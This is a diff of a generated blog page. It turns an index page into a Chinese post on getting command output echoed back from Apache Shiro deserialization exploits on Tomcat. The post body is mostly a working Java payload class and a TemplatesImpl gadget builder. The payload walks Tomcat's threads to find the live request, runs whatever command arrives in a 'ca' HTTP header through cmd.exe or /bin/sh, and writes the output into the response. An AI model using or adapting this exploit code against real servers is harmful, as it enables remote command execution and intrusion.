@@ -20,27 +20,32 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Corener">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="###shiro回显修改Gadgets.java中原始的类和方法:StubTransletPayload.class –&gt; Tomback.classcreateTemplatesImpl(final String cmd) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro 回显">
+<meta property="og:url" content="http://yoursite.com/2020/04/30/Shiro-Echo/index.html">
 <meta property="og:site_name" content="Corener">
+<meta property="og:description" content="###shiro回显修改Gadgets.java中原始的类和方法:StubTransletPayload.class –&gt; Tomback.classcreateTemplatesImpl(final String cmd) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464">
+<meta property="article:published_time" content="2020-04-30T10:17:25.114Z">
+<meta property="article:modified_time" content="2020-04-30T10:17:25.114Z">
 <meta property="article:author" content="Corener">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/">
+<link rel="canonical" href="http://yoursite.com/2020/04/30/Shiro-Echo/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'default'
   };
 </script>
 
-  <title>Corener</title>
+  <title>Shiro 回显 | Corener</title>
   
 
 
@@ -149,9 +154,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
@@ -167,10 +173,9 @@
       <meta itemprop="name" content="Corener">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/30/Shiro-Echo/" class="post-title-link" itemprop="url">Shiro 回显</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Shiro 回显
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -193,107 +198,38 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>###shiro回显<br>修改Gadgets.java中原始的类和方法:<br>StubTransletPayload.class –&gt; Tomback.class<br>createTemplatesImpl(final String cmd)</p>
+        <p>###shiro回显<br>修改Gadgets.java中原始的类和方法:<br>StubTransletPayload.class –&gt; Tomback.class<br>createTemplatesImpl(final String cmd)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">public static class Tomback extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    public Object getO(Object o,String s) throws Exception&#123;</span><br><span class="line">        Field f = o.getClass().getDeclaredField(s);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Tomback() throws Exception&#123;</span><br><span class="line">        Object o;</span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">for</span> (Thread t:(Thread[])getO(Thread.currentThread().getThreadGroup(),<span class="string">"threads"</span>))&#123;</span><br><span class="line">            s = t.getName();</span><br><span class="line">            <span class="keyword">if</span> (!s.contains(<span class="string">"exec"</span>) &amp;&amp; s.contains(<span class="string">"http"</span>))&#123;</span><br><span class="line">                try&#123;</span><br><span class="line">                    o = getO(getO(getO(t,<span class="string">"target"</span>),<span class="string">"this<span class="variable">$0</span>"</span>),<span class="string">"handler"</span>);</span><br><span class="line">                &#125;catch (Exception e)&#123;</span><br><span class="line">                    //tomcat 8.5.* ~</span><br><span class="line">                    o = getO(getO(t,<span class="string">"target"</span>),<span class="string">"this<span class="variable">$0</span>"</span>);</span><br><span class="line">                    Field f = AbstractEndpoint.class.getDeclaredField(<span class="string">"handler"</span>);</span><br><span class="line">                    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    o = f.get(o);</span><br><span class="line">                &#125;</span><br><span class="line">                try&#123;</span><br><span class="line">                    //tomcat 6.*</span><br><span class="line">                    o = getO(o,<span class="string">"global"</span>);</span><br><span class="line">                &#125;catch (Exception e)&#123;</span><br><span class="line">                    //tomcat7.*-8.0.*</span><br><span class="line">                    o = o.getClass().getSuperclass().getDeclaredMethod(<span class="string">"getGlobal"</span>).invoke(o);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (Object p:(ArrayList&lt;?&gt;)getO(o,<span class="string">"processors"</span>))&#123;</span><br><span class="line">                    o = getO(p,<span class="string">"req"</span>);</span><br><span class="line">                    s = (String)o.getClass().getMethod(<span class="string">"getHeader"</span>,String.class).invoke(o,<span class="string">"ca"</span>);</span><br><span class="line">                    <span class="keyword">if</span>(!s.isEmpty())&#123;</span><br><span class="line">                        String[] cmd = System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"window"</span>)?new String[]&#123;<span class="string">"cmd.exe"</span>,<span class="string">"/c"</span>,s&#125;:new String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,s&#125;;</span><br><span class="line">                        byte[] cm = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().getBytes();</span><br><span class="line">                        ByteChunk bc = new ByteChunk();</span><br><span class="line">                        bc.setBytes(cm,0,cm.length);</span><br><span class="line">                        o = o.getClass().getMethod(<span class="string">"getResponse"</span>).invoke(o);</span><br><span class="line">                        o.getClass().getMethod(<span class="string">"setStatus"</span>,int.class).invoke(o,404);</span><br><span class="line">                        o.getClass().getMethod(<span class="string">"doWrite"</span>,ByteChunk.class).invoke(o,bc);</span><br><span class="line">                        <span class="built_in">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">public static Object createTemplatesImpl(final String cmd) throws Exception &#123;</span><br><span class="line">    TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">    ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">    classPool.insertClassPath(new ClassClassPath(Tomback.class));</span><br><span class="line">    CtClass clazz = classPool.get(Tomback.class.getName());</span><br><span class="line">    CtClass superC = classPool.get(AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    final byte[] classBytes = clazz.toBytecode();</span><br><span class="line">    Field bcField = TemplatesImpl.class.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">    bcField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    bcField.set(templates, new byte[][] &#123;classBytes&#125;);</span><br><span class="line">    Field nameField = TemplatesImpl.class.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates, <span class="string">"a"</span>);</span><br><span class="line">    clazz.writeFile();</span><br><span class="line">    <span class="built_in">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>reference：<a href="https://xz.aliyun.com/t/6227" target="_blank" rel="noopener">https://xz.aliyun.com/t/6227</a></p>
 
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/04/30/Shiro-Echo/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/28/Tomcat-Echo/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/logo2.jpg">
-      <meta itemprop="name" content="Corener">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Corener">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/28/Tomcat-Echo/" class="post-title-link" itemprop="url">Tomcat通用回显 & Shiro 回显利用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-04-28 23:53:34" itemprop="dateCreated datePublished" datetime="2020-04-28T23:53:34+08:00">2020-04-28</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="中间件context回显方式"><a href="#中间件context回显方式" class="headerlink" title="中间件context回显方式"></a>中间件context回显方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Weblogic回显</span></span><br><span class="line">1. Thread -&gt; getCurrentWork --&gt; context</span><br><span class="line">2. Thread --&gt; getCurrentWork --&gt; connectionHandler --&gt; context</span><br><span class="line"><span class="comment"># Spring Boot回显</span></span><br><span class="line">1. org.springframework.web.context.request.RequestContextHolder </span><br><span class="line">2. org.springframework.webflow.context.ExternalContextHolder</span><br><span class="line"><span class="comment"># tomcat回显</span></span><br><span class="line">1. Linux平台下，利用文件描述符回显</span><br></pre></td></tr></table></figure>
-
-<p>reference：<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">00theway</a></p>
-<h3 id="回显研究"><a href="#回显研究" class="headerlink" title="回显研究"></a>回显研究</h3><h4 id="1-Get-tomcat-Channel"><a href="#1-Get-tomcat-Channel" class="headerlink" title="1.Get tomcat Channel"></a>1.Get tomcat Channel</h4><p>从Thread.currentThread()出发，发现当前线程有关FD描述符的路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Thread--&gt;target--&gt;selector[SelectorImpl]--&gt;fdMap--&gt;key-value--&gt;SocketChannel</span><br><span class="line"></span><br><span class="line">[SelectorImpl针对不同平台有不同实现：EpollSelectorImpl（linux）、WindowsSelectorImpl（windows）、KQueueSelectorImpl（MacOSX）]</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/15880587778842/15880588129524.jpg" alt></p>
-<p>通过这种方式可以跨平台对SocketChannel进行写入操作，达到回显的效果。<br>缺点：对http的所有连接都会回写，无法筛选当前请求的唯一连接。</p>
-<p>伪代码：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/04/28/Tomcat-Echo/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/28/Tomcat-Echo/" rel="prev" title="Tomcat通用回显 & Shiro 回显利用">
+      <i class="fa fa-chevron-left"></i> Tomcat通用回显 & Shiro 回显利用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
